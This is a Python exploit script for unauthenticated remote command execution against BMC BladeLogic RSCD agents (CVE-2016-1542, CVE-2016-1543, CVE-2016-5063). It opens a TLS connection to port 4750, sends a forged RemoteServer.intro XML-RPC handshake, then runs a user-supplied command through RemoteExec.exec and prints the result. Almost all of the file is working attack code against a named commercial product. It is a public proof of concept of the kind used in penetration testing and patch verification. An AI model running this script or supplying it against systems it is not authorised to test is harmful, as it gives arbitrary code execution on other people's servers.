#!/usr/bin/python

# BMC BladeLogic RSCD agent remote exec - XMLRPC version
# CVE: CVE-2016-1542 (BMC-2015-0010), CVE-2016-1543 (BMC-2015-0011), CVE-2016-5063
# By Paul Taylor / Foregenix Ltd
# https://github.com/bao7uo/bmc_bladelogic/edit/master/BMC_rexec.py
# https://www.foregenix.com/blog

# Credit: https://github.com/ernw/insinuator-snippets/tree/master/bmc_bladelogic
# Credit: https://github.com/yaolga

# Newer version by Quentin FRATY


import socket
import ssl
import sys
import argparse
import requests
import httplib2
import gzip
from requests.packages.urllib3 import PoolManager
from requests.packages.urllib3.connection import HTTPConnection
from requests.packages.urllib3.connectionpool import HTTPConnectionPool
from requests.adapters import HTTPAdapter


class MyHTTPConnection(HTTPConnection):
    def __init__(self, unix_socket_url, timeout=60):
        HTTPConnection.__init__(self, HOST, timeout=timeout)
        self.unix_socket_url = unix_socket_url
        self.timeout = timeout

    def connect(self):
        self.sock = wrappedSocket


class MyHTTPConnectionPool(HTTPConnectionPool):
    def __init__(self, socket_path, timeout=60):
        HTTPConnectionPool.__init__(self, HOST, timeout=timeout)
        self.socket_path = socket_path
        self.timeout = timeout

    def _new_conn(self):
        return MyHTTPConnection(self.socket_path, self.timeout)


class MyAdapter(HTTPAdapter):
    def __init__(self, timeout=60):
        super(MyAdapter, self).__init__()
        self.timeout = timeout

    def get_connection(self, socket_path, proxies=None):
        return MyHTTPConnectionPool(socket_path, self.timeout)

    def request_url(self, request, proxies):
        return request.path_url


def optParser():
    parser = argparse.ArgumentParser(
                        description="Remote exec " +
                        "BladeLogic Server Automation RSCD agent"
                    )
    parser.add_argument("host", help="IP address of a target system")
    parser.add_argument(
            "-p",
            "--port",
            type=int,
            default=4750,
            help="TCP port (default: 4750)"
            )
    parser.add_argument("command", help="Command to execute")
    opts = parser.parse_args()
    return opts

def sendXMLRPC(sock, data):
    header = b"""POST /xmlrpc HTTP/1.1\r\nHost: 127.0.0.1\r\nUser-Agent: Quentin\r\nAccept: */*\r\nConnection: keep-alive\r\nContent-Length: %u\r\n\r\n""" % len(data)
    pkt = header + data
    sock.send(pkt)
    r = sock.recv(4096)
    if not b"\r\n\r\n" in r:
        r += sock.recv(4096)
    print("---------------")
    try:
        header, data = r.split(b"\r\n\r\n", 1)
    except ValueError:
        print("Cannot split Header from content")

    try:
        content = gzip.decompress(data)
    except :
        content = data
        print("Not Gzipped file, returning as it is")
    return content


intro = b"""<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>RemoteServer.intro</methodName><params><param><value>2016-1-14-18-10-30-3920958</value></param><param><value>7</value></param><param><value>0;0;21;AArverManagement_XXX_XXX:XXXXXXXX;2;CM;-;-;0;-;1;1;6;SYSTEM;CP1252;</value></param><param><value>8.6.01.66</value></param></params></methodCall>"""
options = optParser()
rexec = options.command.encode()
PORT = options.port
HOST = options.host
rexec = b"""<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>RemoteExec.exec</methodName><params><param><value>""" + rexec  + b"""</value></param></params></methodCall>"""

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((HOST, PORT))

sock.sendall(b"TLSRPC")
wrappedSocket = ssl.wrap_socket(sock)

adapter = MyAdapter()
s = requests.session()
s.mount("http://", adapter)


part1 = sendXMLRPC(wrappedSocket, intro)
part2 = sendXMLRPC(wrappedSocket, rexec)
print(part2.decode())
wrappedSocket.close()
